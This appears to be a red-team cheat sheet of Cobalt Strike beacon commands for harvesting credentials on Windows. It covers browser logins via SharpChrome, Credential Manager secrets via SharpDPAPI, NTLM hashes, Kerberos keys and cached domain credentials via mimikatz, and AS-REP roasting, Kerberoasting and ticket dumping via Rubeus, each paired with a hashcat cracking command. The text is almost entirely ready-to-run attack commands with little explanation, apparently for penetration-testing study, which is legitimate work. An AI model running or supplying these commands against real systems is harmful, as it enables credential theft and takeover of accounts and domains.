## 🗝️  **CREDENTIAL EXTRACTION FROM WEB BROWSERS**

- Requires Medium Integrity Beacon

```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```


## 🛡️ **CREDENTIAL EXTRACTION: WINDOWS CREDENTIAL MANAGER**

-  Requires a Medium Integrity Beacon and access to the user account whose credentials you want to extract.
  
>Enumerate if there are saved credentials
```powershell
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
```

>Decrypt with SharpDPAPI*
```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```


## 🧠 **EXTRACT CREDS FROM THE OS**

> Extract the **NTLM** hash -> Pass The Hash
> You must have a high integrity beacon and **then use ! to impersonate the SYSTEM token**

```powershell
beacon> mimikatz sekurlsa::logonpasswords
```

 ```powershell
 PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
```


> Extract AES256 Kerberos KEY -> the longest des_cbc_md4.

```powershell
beacon> mimikatz sekurlsa::ekeys
```

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
```

## 📦 **CREDENTIALS STORED IN DOMAIN CACHE**

```powershell
beacon> mimikatz !lsadump::cache
```

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
```

## 🔥 **KERBEROS TICKETS**

**AS-REP Roasting**

>Search for accounts

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
```

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
```

**Kerberoasting**

> Search for accounts

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
```

```powershell
PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
```


**Extract Tickets**

>Must have High Integrity*
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage


beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x35b1d /service:krbtgt /nowrap
```
